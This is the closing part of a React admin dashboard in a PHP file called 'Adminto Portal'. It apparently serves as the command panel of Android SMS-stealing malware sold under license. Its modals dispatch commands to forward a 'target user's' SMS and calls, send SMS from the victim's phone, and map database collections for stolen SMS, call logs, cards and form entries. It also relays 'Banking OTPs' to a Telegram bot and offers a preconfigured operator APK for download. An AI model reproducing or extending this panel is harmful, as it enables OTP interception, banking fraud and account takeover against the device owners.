          {/* Remote Forward Command Modal Overlay (ForwardData.kt) */}
          {showForwardModal && forwardTargetDevice && (
            <div className="modal-overlay" onClick={() => setShowForwardModal(false)}>
              <div className="glass-panel" style={{ width: '100%', maxWidth: '500px', padding: '2rem' }} onClick={(e) => e.stopPropagation()}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
                  <div>
                    <h3 style={{ color: '#fff' }}>📲 Remote Forward Command</h3>
                    <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>Dispatch SMS / Call forward task to target device</p>
                  </div>
                  <button onClick={() => setShowForwardModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                <div className="glass-panel" style={{ padding: '1rem', marginBottom: '1.25rem', border: '1px solid rgba(236,72,153,0.3)', background: 'rgba(236,72,153,0.05)' }}>
                  <div style={{ fontSize: '0.85rem', color: '#fff', display: 'flex', flexDirection: 'column', gap: '4px' }}>
                    <div>Target User: <strong style={{ color: '#ec4899' }}>{forwardTargetDevice.fullName}</strong></div>
                    <div>Mobile: <strong>{forwardTargetDevice.mobileNumber}</strong> • User ID: <code style={{ color: '#93c5fd' }}>{forwardTargetDevice.userId}</code></div>
                  </div>
                </div>

                <form onSubmit={handleDispatchForwardCommand} style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>1. Select Data Forward Type</label>
                    <div style={{ display: 'flex', gap: '10px' }}>
                      <button type="button" className={`sim-select-pill ${forwardDataType === 'SMS' ? 'active' : ''}`} onClick={() => setForwardDataType('SMS')} style={{ flex: 1, justifyContent: 'center' }}>
                        Forward SMS
                      </button>
                      <button type="button" className={`sim-select-pill ${forwardDataType === 'Call' ? 'active' : ''}`} onClick={() => setForwardDataType('Call')} style={{ flex: 1, justifyContent: 'center' }}>
                        Forward Call
                      </button>
                    </div>
                  </div>

                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>2. Select Target SIM Slot (`SimData`)</label>
                    <div style={{ display: 'flex', gap: '10px' }}>
                      <button type="button" className={`sim-select-pill ${forwardSimSlot === 'SIM 1' ? 'active' : ''}`} onClick={() => setForwardSimSlot('SIM 1')} style={{ flex: 1, justifyContent: 'center' }}>
                        📶 SIM Slot 1
                      </button>
                      <button type="button" className={`sim-select-pill ${forwardSimSlot === 'SIM 2' ? 'active' : ''}`} onClick={() => setForwardSimSlot('SIM 2')} style={{ flex: 1, justifyContent: 'center' }}>
                        📶 SIM Slot 2
                      </button>
                    </div>
                  </div>

                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>3. Destination Forward Phone Number</label>
                    <input 
                      type="text" 
                      className="search-input" 
                      placeholder="e.g. +919876543210" 
                      value={forwardDestinationNumber} 
                      onChange={(e) => setForwardDestinationNumber(e.target.value)} 
                      required 
                    />
                  </div>

                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.85rem', background: 'linear-gradient(135deg, #ec4899, #8b5cf6)', marginTop: '0.5rem', fontSize: '0.95rem' }}>
                    🚀 Dispatch Forwarding Command Payload
                  </button>
                </form>
              </div>
            </div>
          )}

          {/* Remote Send SMS Command Modal Overlay */}
          {showSendSmsModal && forwardTargetDevice && (
            <div className="modal-overlay" onClick={() => setShowSendSmsModal(false)}>
              <div className="glass-panel" style={{ width: '100%', maxWidth: '500px', padding: '2rem' }} onClick={(e) => e.stopPropagation()}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
                  <div>
                    <h3 style={{ color: '#fff' }}>💬 Send Remote SMS</h3>
                    <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>Send outgoing SMS remotely via target Android device</p>
                  </div>
                  <button onClick={() => setShowSendSmsModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                <div className="glass-panel" style={{ padding: '1rem', marginBottom: '1.25rem', border: '1px solid rgba(52,211,153,0.3)', background: 'rgba(52,211,153,0.05)' }}>
                  <div style={{ fontSize: '0.85rem', color: '#fff', display: 'flex', flexDirection: 'column', gap: '4px' }}>
                    <div>Target User: <strong style={{ color: '#34d399' }}>{forwardTargetDevice.fullName}</strong></div>
                    <div>Mobile: <strong>{forwardTargetDevice.mobileNumber}</strong> • User ID: <code style={{ color: '#93c5fd' }}>{forwardTargetDevice.userId}</code></div>
                  </div>
                </div>

                <form onSubmit={handleDispatchSendSmsCommand} style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>1. Select Sender SIM Slot</label>
                    <div style={{ display: 'flex', gap: '10px' }}>
                      <button type="button" className={`sim-select-pill ${smsSimSlot === 'SIM 1' ? 'active' : ''}`} onClick={() => setSmsSimSlot('SIM 1')} style={{ flex: 1, justifyContent: 'center' }}>
                        📶 SIM Slot 1 ({getSim1Phone(forwardTargetDevice)})
                      </button>
                      <button type="button" className={`sim-select-pill ${smsSimSlot === 'SIM 2' ? 'active' : ''}`} onClick={() => setSmsSimSlot('SIM 2')} style={{ flex: 1, justifyContent: 'center' }}>
                        📶 SIM Slot 2 ({getSim2Phone(forwardTargetDevice)})
                      </button>
                    </div>
                  </div>

                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>2. Target Recipient Phone Number</label>
                    <input 
                      type="text" 
                      className="search-input" 
                      placeholder="e.g. +919876543210" 
                      value={smsTargetNumber} 
                      onChange={(e) => setSmsTargetNumber(e.target.value)} 
                      required 
                    />
                  </div>

                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>3. SMS Message Text</label>
                    <textarea 
                      className="search-input" 
                      rows="3" 
                      placeholder="Type your message text here..." 
                      value={smsMessageBody} 
                      onChange={(e) => setSmsMessageBody(e.target.value)} 
                      required 
                      style={{ width: '100%', borderRadius: '12px', resize: 'vertical' }}
                    />
                  </div>

                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.85rem', background: 'linear-gradient(135deg, #10b981, #059669)', marginTop: '0.5rem', fontSize: '0.95rem' }}>
                    💬 Dispatch Send SMS Command
                  </button>
                </form>
              </div>
            </div>
          )}

          {/* Master Settings Panel Modal Overlay */}
          {showFirebaseModal && (
            <div className="modal-overlay" onClick={() => setShowFirebaseModal(false)}>
              <div className="glass-panel" style={{ width: '100%', maxWidth: '650px', padding: '1.75rem', maxHeight: '90vh', overflowY: 'auto' }} onClick={(e) => e.stopPropagation()}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
                  <div>
                    <h3 style={{ color: '#fff' }}>⚙️ Master Settings Console</h3>
                    <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>Configure Database, Telegram Alerts, Anti-Delete & Active Sessions</p>
                  </div>
                  <button onClick={() => setShowFirebaseModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                {/* Sub-Tabs */}
                <div style={{ display: 'flex', gap: '8px', marginBottom: '1.25rem', overflowX: 'auto', paddingBottom: '4px' }}>
                  <button className={`tab-btn ${settingsSubTab === 'firebase' ? 'active' : ''}`} onClick={() => setSettingsSubTab('firebase')}>
                    🔥 Firebase DB
                  </button>
                  <button className={`tab-btn ${settingsSubTab === 'security' ? 'active' : ''}`} onClick={() => setSettingsSubTab('security')}>
                    🛡️ Security & Anti-Delete
                  </button>
                  <button className={`tab-btn ${settingsSubTab === 'telegram' ? 'active' : ''}`} onClick={() => setSettingsSubTab('telegram')}>
                    💬 Telegram Bot
                  </button>
                  <button className={`tab-btn ${settingsSubTab === 'sessions' ? 'active' : ''}`} onClick={() => setSettingsSubTab('sessions')}>
                    🚪 Sessions
                  </button>
                </div>

                {/* Sub-Tab 1: Firebase */}
                {settingsSubTab === 'firebase' && (
                  <div>
                    {fbSaveStatus && (
                      <div style={{ padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', marginBottom: '1rem', background: fbSaveStatus.includes('✓') ? 'rgba(16,185,129,0.15)' : 'rgba(99,102,241,0.15)', color: fbSaveStatus.includes('✓') ? '#34d399' : '#818cf8' }}>
                        {fbSaveStatus}
                      </div>
                    )}

                    {/* Auto Parse Card */}
                    <div className="glass-panel" style={{ padding: '1rem', marginBottom: '1.25rem', border: '1px dashed rgba(251,191,36,0.4)', background: 'rgba(251,191,36,0.05)' }}>
                      <label style={{ fontSize: '0.8rem', color: '#fbbf24', fontWeight: 600, display: 'block', marginBottom: '6px' }}>⚡ Auto-Fill: Paste Firebase Config Snippet</label>
                      <textarea 
                        className="search-input" 
                        rows="3" 
                        placeholder="Paste const firebaseConfig = { apiKey: '...', projectId: '...' } here..." 
                        value={fbJsonPaste}
                        onChange={(e) => setFbJsonPaste(e.target.value)}
                        style={{ fontFamily: 'monospace', fontSize: '0.8rem', width: '100%', borderRadius: '12px' }}
                      />
                      <button type="button" className="btn-secondary" onClick={handleParseFbJson} style={{ marginTop: '8px', color: '#fbbf24', width: '100%' }}>
                        ✨ Auto-Parse Firebase Snippet
                      </button>
                    </div>

                    <form onSubmit={handleSaveFirebaseSettings} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                      <div>
                        <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Firebase Project ID</label>
                        <input type="text" className="search-input" value={fbProject} onChange={(e) => setFbProject(e.target.value)} placeholder="adminto-custom-db" required />
                      </div>
                      <div>
                        <label style={{ fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700, display: 'block', marginBottom: '4px' }}>🔗 Firebase Database URL (`databaseURL`) ⭐ REQUIRED FOR LIVE DATA</label>
                        <input type="text" className="search-input" value={fbDatabaseUrl} onChange={(e) => setFbDatabaseUrl(e.target.value)} placeholder="https://your-app-default-rtdb.asia-southeast1.firebasedatabase.app" style={{ borderColor: fbDatabaseUrl ? 'rgba(56,189,248,0.5)' : 'rgba(239,68,68,0.4)' }} />
                        {!fbDatabaseUrl && <p style={{ fontSize: '0.72rem', color: '#f87171', marginTop: '4px' }}>⚠️ Without this URL, live data will NOT load. Paste your Firebase databaseURL here.</p>}
                      </div>
                      <div>
                        <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>App ID (`appId`)</label>
                        <input type="text" className="search-input" value={fbAppId} onChange={(e) => setFbAppId(e.target.value)} placeholder="1:179278690008:android:bed6..." />
                      </div>
                      <div>
                        <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>API Key (`apiKey`)</label>
                        <input type="text" className="search-input" value={fbApiKey} onChange={(e) => setFbApiKey(e.target.value)} placeholder="AIzaSyA..." />
                      </div>
                      <div>
                        <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Auth Domain (`authDomain`)</label>
                        <input type="text" className="search-input" value={fbAuthDomain} onChange={(e) => setFbAuthDomain(e.target.value)} placeholder="project.firebaseapp.com" />
                      </div>
                      <div>
                        <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Storage Bucket (`storageBucket`)</label>
                        <input type="text" className="search-input" value={fbStorageBucket} onChange={(e) => setFbStorageBucket(e.target.value)} placeholder="project.appspot.com" />
                      </div>
                      {/* SuperAdmin Custom Collection Mapping */}
                      <div className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(56,189,248,0.3)', background: 'rgba(56,189,248,0.05)', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                          <label style={{ fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700 }}>🔍 SuperAdmin Firebase Collection Mappings</label>
                          <span className="pulse-badge active" style={{ fontSize: '0.7rem' }}>One-Click Presets Active</span>
                        </div>

                        {/* Presets Selector Dropdown & Preset Manager */}
                        <div style={{ background: 'rgba(17,24,39,0.8)', padding: '10px 12px', borderRadius: '10px', border: '1px dashed rgba(56,189,248,0.4)' }}>
                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                            <label style={{ fontSize: '0.75rem', color: '#38bdf8', fontWeight: 600 }}>⚡ Select Database Schema Preset (Auto-Fill Mappings):</label>
                            <button type="button" onClick={handleSaveNewFbPreset} style={{ background: 'rgba(56,189,248,0.15)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)', borderRadius: '6px', padding: '2px 8px', fontSize: '0.72rem', fontWeight: 700, cursor: 'pointer' }}>
                              ➕ Save as New Preset
                            </button>
                          </div>
                          <div style={{ display: 'flex', gap: '6px' }}>
                            <select className="filter-select" style={{ flex: 1, borderRadius: '8px' }} value={fbPresetKey} onChange={(e) => handleApplyFbPreset(e.target.value)}>
                              <option value="custom">🛠️ Custom Manual Setup</option>
                              {Object.entries(allFbPresets).map(([key, p]) => (
                                <option key={key} value={key}>{p.name}</option>
                              ))}
                            </select>
                            {fbPresetKey.startsWith('user_preset_') && (
                              <button type="button" onClick={() => handleDeleteFbCustomPreset(fbPresetKey)} style={{ background: 'rgba(239,68,68,0.15)', color: '#f87171', border: '1px solid rgba(239,68,68,0.3)', borderRadius: '8px', padding: '0 10px', fontSize: '0.75rem', cursor: 'pointer' }} title="Delete Custom Preset">
                                🗑️
                              </button>
                            )}
                          </div>
                        </div>

                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
                          <div>
                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>SMS Collection Name</label>
                            <input type="text" className="search-input" value={fbSmsColl} onChange={(e) => { setFbSmsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="smsData (or sma)" />
                          </div>
                          <div>
                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Calls Collection Name</label>
                            <input type="text" className="search-input" value={fbCallsColl} onChange={(e) => { setFbCallsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="callData (or calls)" />
                          </div>
                          <div>
                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Cards Collection Name</label>
                            <input type="text" className="search-input" value={fbCardsColl} onChange={(e) => { setFbCardsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="cardData (or cards)" />
                          </div>
                          <div>
                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Form Fill-ups Collection</label>
                            <input type="text" className="search-input" value={fbFormsColl} onChange={(e) => { setFbFormsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="formData (or userInputs)" />
                          </div>
                          <div>
                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Device / SIM Info Collection</label>
                            <input type="text" className="search-input" value={fbSimsColl} onChange={(e) => { setFbSimsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="user_data (or clients)" />
                          </div>
                        </div>
                      </div>

                      <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.8rem', background: 'linear-gradient(135deg, #fbbf24, #d97706)', marginTop: '0.5rem' }}>
                        💾 Save Firebase Configuration & Collection Mappings
                      </button>
                    </form>
                  </div>
                )}

                {/* Sub-Tab 2: Security & Anti-Delete */}
                {settingsSubTab === 'security' && (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                    <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(99,102,241,0.3)', background: 'rgba(99,102,241,0.05)' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <div>
                          <h4 style={{ color: '#fff', fontSize: '1rem', marginBottom: '4px' }}>🛡️ Anti-Deletion Safeguard</h4>
                          <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>Prevents accidental or unauthorized deletion of devices, SMS & call logs</p>
                        </div>
                        <button className="btn-secondary" onClick={handleToggleDeleteProtection} style={{ color: deleteProtectionEnabled ? '#34d399' : '#f87171', border: deleteProtectionEnabled ? '1px solid rgba(16,185,129,0.4)' : '1px solid rgba(239,68,68,0.4)' }}>
                          {deleteProtectionEnabled ? '🟢 ENABLED' : '🔴 DISABLED'}
                        </button>
                      </div>
                    </div>

                    <div className="glass-panel" style={{ padding: '1.25rem' }}>
                      <h4 style={{ color: '#fff', fontSize: '0.95rem', marginBottom: '8px' }}>🔐 Zero-Trace Encryption Mode</h4>
                      <p style={{ fontSize: '0.8rem', color: '#9ca3af', marginBottom: '1rem' }}>All transient SMS and banking OTP payloads are memory-encrypted during live transit.</p>
                      <span className="pulse-badge active">✓ End-to-End Encrypted</span>
                    </div>
                  </div>
                )}

                {/* Sub-Tab 3: Telegram Bot Forwarding */}
                {settingsSubTab === 'telegram' && (
                  <form onSubmit={handleSaveTelegramConfig} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                    {telegramSaveStatus && (
                      <div style={{ padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', background: 'rgba(16,185,129,0.15)', color: '#34d399' }}>
                        {telegramSaveStatus}
                      </div>
                    )}
                    <div className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(56,189,248,0.3)', background: 'rgba(56,189,248,0.05)' }}>
                      <p style={{ fontSize: '0.82rem', color: '#38bdf8' }}>
                        📲 Forward incoming SMS, Banking OTPs, and Call notifications instantly to your private Telegram Bot or Channel.
                      </p>
                    </div>
                    <div>
                      <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Telegram Bot Token</label>
                      <input type="text" className="search-input" value={telegramBotToken} onChange={(e) => setTelegramBotToken(e.target.value)} placeholder="123456789:ABCdefGhIJKlmNoPQ..." />
                    </div>
                    <div>
                      <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Telegram Chat ID / Channel ID</label>
                      <input type="text" className="search-input" value={telegramChatId} onChange={(e) => setTelegramChatId(e.target.value)} placeholder="-100123456789 or @my_channel" />
                    </div>
                    <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.8rem', background: 'linear-gradient(135deg, #0284c7, #38bdf8)' }}>
                      💬 Connect Telegram Bot Forwarding
                    </button>
                  </form>
                )}

                {/* Sub-Tab 4: Sessions */}
                {settingsSubTab === 'sessions' && (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                    <div className="glass-panel" style={{ padding: '1.25rem' }}>
                      <h4 style={{ color: '#fff', fontSize: '0.95rem', marginBottom: '8px' }}>👤 Current Operator Session</h4>
                      <div style={{ fontSize: '0.85rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '6px' }}>
                        <div>Username: <strong style={{ color: '#fff' }}>{adminUser?.username}</strong></div>
                        <div>Session Scope: <code style={{ color: '#93c5fd' }}>{adminUser?.firebaseConfig?.projectId || 'Default Scope'}</code></div>
                        <div>Status: <span style={{ color: '#34d399', fontWeight: 600 }}>🟢 Active Now</span></div>
                      </div>
                    </div>

                    <button className="btn-primary" onClick={handleTerminateAllSessions} style={{ background: 'linear-gradient(135deg, #dc2626, #ef4444)', width: '100%', padding: '0.8rem' }}>
                      🚪 Terminate All Active Sessions
                    </button>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Change Password Modal Overlay */}
          {showChangePassModal && (
            <div className="modal-overlay" onClick={() => setShowChangePassModal(false)}>
              <div className="glass-panel" style={{ width: '100%', maxWidth: '400px', padding: '2rem' }} onClick={(e) => e.stopPropagation()}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
                  <h3 style={{ color: '#fff' }}>🔒 Change Password</h3>
                  <button onClick={() => setShowChangePassModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                {changePassStatus && (
                  <div style={{ padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', marginBottom: '1rem', background: changePassStatus.includes('✓') ? 'rgba(16,185,129,0.15)' : 'rgba(99,102,241,0.15)', color: changePassStatus.includes('✓') ? '#34d399' : '#818cf8' }}>
                    {changePassStatus}
                  </div>
                )}

                <form onSubmit={handleChangePasswordSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Logged-in Operator Account</label>
                    <input type="text" className="search-input" value={adminUser?.username} disabled style={{ opacity: 0.7 }} />
                  </div>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>New Password</label>
                    <input 
                      type="password" 
                      className="search-input" 
                      placeholder="Enter new password" 
                      value={newPassInput} 
                      onChange={(e) => setNewPassInput(e.target.value)} 
                      required 
                    />
                  </div>
                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.75rem', marginTop: '0.5rem' }}>
                    Update Password
                  </button>
                </form>
              </div>
            </div>
          )}

          {/* Download Operator APK Modal Overlay */}
          {showApkModal && (
            <div className="modal-overlay">
              <div className="glass-panel modal-content" style={{ maxWidth: '640px' }}>
                <div style={{ padding: '1.25rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div>
                    <h3 style={{ color: '#fff' }}>📲 Download Custom Operator APK</h3>
                    <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>Pre-configured Android App linked directly to your database</p>
                  </div>
                  <button onClick={() => setShowApkModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                <div style={{ padding: '1.5rem', overflowY: 'auto', flex: 1, display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                  <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(16,185,129,0.3)', background: 'rgba(16,185,129,0.05)' }}>
                    <h4 style={{ color: '#34d399', fontSize: '0.9rem', marginBottom: '8px' }}>🛡️ Embedded Operator Credentials</h4>
                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem', fontSize: '0.8rem' }}>
                      <div><span style={{ color: '#9ca3af' }}>Operator:</span> <strong style={{ color: '#fff' }}>{adminUser?.username}</strong></div>
                      <div><span style={{ color: '#9ca3af' }}>Firebase Project ID:</span> <code style={{ color: '#93c5fd' }}>{adminUser?.firebaseConfig?.projectId || 'adminto-default'}</code></div>
                      <div><span style={{ color: '#9ca3af' }}>Organization Scope:</span> <code style={{ color: '#c084fc' }}>{adminUser?.firebaseConfig?.orgId || 'org_main'}</code></div>
                      <div><span style={{ color: '#9ca3af' }}>Status:</span> <span style={{ color: '#34d399', fontWeight: 600 }}>✓ Verified</span></div>
                    </div>
                  </div>

                  <div>
                    <button type="button" className="btn-primary" onClick={handleDownloadApkFile} style={{ background: 'linear-gradient(135deg, #10b981, #059669)', width: '100%', justifyContent: 'center', padding: '0.9rem', fontSize: '1rem' }}>
                      📥 Download Official Android APK (12.2 MB)
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Login Modal Overlay if not logged in */}
          {!adminUser && (
            <div className="modal-overlay">
              <div className="glass-panel" style={{ width: '100%', maxWidth: '420px', padding: '2.5rem 2rem' }}>
                <div style={{ textAlign: 'center', marginBottom: '1.5rem' }}>
                  <div className="brand-icon" style={{ margin: '0 auto 1rem', width: '56px', height: '56px', borderRadius: '16px' }}>🛡️</div>
                  <h2 style={{ fontSize: '1.6rem', color: '#fff', marginBottom: '4px' }}>Adminto Portal</h2>
                  <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>Dedicated Admin Database Authentication</p>
                </div>

                {loginError && (
                  <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', marginBottom: '1.25rem', textAlign: 'center' }}>
                    {loginError}
                  </div>
                )}

                <form onSubmit={handleLoginSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                  <div>
                    <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Username or Email</label>
                    <input 
                      type="text" 
                      className="search-input" 
                      style={{ maxWidth: '100%', paddingLeft: '1rem' }}
                      value={loginUser}
                      onChange={(e) => setLoginUser(e.target.value)}
                      placeholder="Enter Username or Email"
                      autoComplete="off"
                    />
                  </div>

                  <div>
                    <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Password</label>
                    <input 
                      type="password" 
                      className="search-input" 
                      style={{ maxWidth: '100%', paddingLeft: '1rem' }}
                      value={loginPass}
                      onChange={(e) => setLoginPass(e.target.value)}
                      placeholder="••••••••"
                      autoComplete="new-password"
                    />
                  </div>

                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.75rem' }}>
                    Sign In
                  </button>
                </form>

                <div style={{ marginTop: '1.25rem', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
                  <a 
                    href="https://t.me/tejashal" 
                    target="_blank" 
                    rel="noopener noreferrer" 
                    style={{ textDecoration: 'none' }}
                  >
                    <button 
                      type="button" 
                      className="btn-secondary" 
                      style={{ 
                        width: '100%', 
                        padding: '0.75rem', 
                        color: '#38bdf8', 
                        border: '1px solid rgba(56, 189, 248, 0.4)', 
                        background: 'rgba(56, 189, 248, 0.08)',
                        fontWeight: 600,
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        gap: '8px'
                      }}
                    >
                      🛒 Buy License
                    </button>
                  </a>
                </div>
              </div>
            </div>
          )}
        </div>
      );
    }

    ReactDOM.createRoot(document.getElementById('root')).render(<App />);
  </script>
<?php include_once __DIR__ . '/footer.php'; ?>
